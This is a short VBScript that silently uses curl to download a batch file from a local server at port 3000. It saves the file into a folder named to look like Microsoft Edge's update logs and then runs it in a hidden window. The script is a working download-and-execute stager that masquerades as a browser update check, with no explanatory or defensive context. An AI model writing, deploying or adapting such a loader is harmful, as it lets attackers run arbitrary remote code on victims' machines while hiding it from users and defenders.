Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

url = "http://localhost:3000/update"
outputFile = "C:/ProgramData/MicrosoftEdge/Updates/UpdateLog/update_check.bat"

' Run curl and wait for completion
exitCode = WshShell.Run("C:\Windows\System32\curl.exe -f -L -s " & url & " -o " & outputFile, 0, True)

If exitCode = 0 Then
    If fso.FileExists(outputFile) Then
        WshShell.Run outputFile, 0
    Else
        WScript.Quit exitCode
    End If
Else
    WScript.Quit exitCode
End If

Set WshShell = Nothing
Set fso = Nothing